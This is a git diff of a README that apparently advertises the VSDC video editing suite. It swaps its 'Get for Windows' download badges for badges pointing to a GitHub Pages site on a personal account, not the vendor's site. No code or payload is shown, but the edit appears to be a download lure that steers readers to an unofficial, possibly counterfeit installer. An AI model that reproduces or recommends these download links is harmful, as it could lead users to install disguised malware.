@@ -5,10 +5,8 @@
 </div>
 <br>
 
-<div align="center">
+[![GET VSDC Multimedia](https://img.shields.io/badge/GET%20%E2%80%94%20VSDC-Multimedia-0078D6?style=for-the-badge&logoColor=white)](https://marindajolie5.github.io/.github/VSDC-Multimedia)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://vsdc-multimedia-suite.github.io/.github/)
-</div>
 
 ---
 
@@ -26,10 +24,8 @@ For users exploring VSDC production options, the multimedia suite provides profe
 <img src="https://www.videosoftdev.com/images/video_editor/screenshots/2.jpg" width="auto">
 </div>
 
-<div align="center">
+[![GET VSDC Multimedia](https://img.shields.io/badge/GET%20%E2%80%94%20VSDC-Multimedia-0078D6?style=for-the-badge&logoColor=white)](https://marindajolie5.github.io/.github/VSDC-Multimedia)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://vsdc-multimedia-suite.github.io/.github/)
-</div>
 
 ---
 ### 🎛 Key Features
